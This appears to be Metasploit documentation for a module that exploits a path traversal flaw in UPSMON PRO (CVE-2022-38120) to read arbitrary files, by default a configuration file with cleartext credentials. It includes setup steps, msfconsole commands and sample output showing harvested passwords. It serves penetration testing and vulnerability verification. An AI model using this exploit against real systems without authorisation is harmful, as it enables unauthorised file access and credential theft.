## Vulnerable Application

This module exploits a path traversal vulnerability in UPSMON PRO <= v2.61 (CVE-2022-38120) to read arbitrary files from the system.
By default, the configuration file will be retrieved, which contains the credentials (CVE-2022-38121) for the web service, mail server,
application, and SMS service.
However, any arbitrary file can be specified.

## Testing

The software can be obtained from
[the vendor](https://www.upspowercom.com/PRO-Windows.jsp).

The web server is disabled by default and needs to be enabled first. In the menu, go to Configuration > UPS Connect, and enable the Web
Server checkbox.
By default, the server listens on TCP port 8000 on all network interfaces and runs in the context of NT AUTHORITY\SYSTEM.

**Successfully tested on**

- UPSMON PRO v2.61 on Windows 22H2
- UPSMON PRO v2.57 on Windows 22H2

## Verification Steps

1. Install and run the application
2. Enable the Web Server module
3. Start `msfconsole` and run the following commands:

```
msf6 > use auxiliary/gather/upsmon_traversal
msf6 auxiliary(gather/upsmon_traversal) > set RHOSTS <IP>
msf6 auxiliary(gather/upsmon_traversal) > run
```

This should return the UPSMON PRO configuration file, UPSMON.ini, which contains various cleartext credentials. Any files retrieved will
be stored as loot.

## Options

### FILE
The file to be retrieved from the file system. By default, this is the UPSMON PRO configuration file, UPSMON.ini. However, any arbitrary
file can be specified.

Example: /Users/Public/UPSMON-Pro/UPSMON.ini

### DEPTH
The traversal depth. The FILE path will be prepended with ../ * DEPTH.

## Scenarios

Running the exploit against v2.61 on Windows 22H22 should result in an output similar to the following:

```
msf6 auxiliary(gather/upsmon_traversal) > run
[*] Running module against 192.168.137.218

[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[+] File retrieved: ../../../../Users/Public/UPSMON-Pro/UPSMON.ini
[*] UPSMON.ini specified, parsing credentials:
[*] SMTP: (not configured)
[*] Port: 25
[*] Email UserName: (not configured)
[*] Email Password: (not configured)
[*] WebServer UserName: UPSMON
[*] WebServer Password: UPSMON
[*] Main AppPassword: UPSMON
[*] SMS UserName: (not configured)
[*] SMS Password: (not configured)
[*] UPS Name: (not configured)
[*] Phone Number: (not configured)
[*] File saved as loot.
[*] Auxiliary module execution completed
```

The file will be stored as loot:

```
msf6 auxiliary(gather/upsmon_traversal) > loot

Loot
====

host             service  type                         name                                 content     info                                               path
----             -------  ----                         ----                                 -------     ----                                               ----
192.168.137.218           upsmonpro.file               /USERS/public/upsmon-pro/upsmon.ini  text/plain  File retrieved through UPSMON PRO path traversal.  /home/foo/.msf4/loot/20250502145519_default_192.168.137.218_upsmonpro.file_396058.txt
```
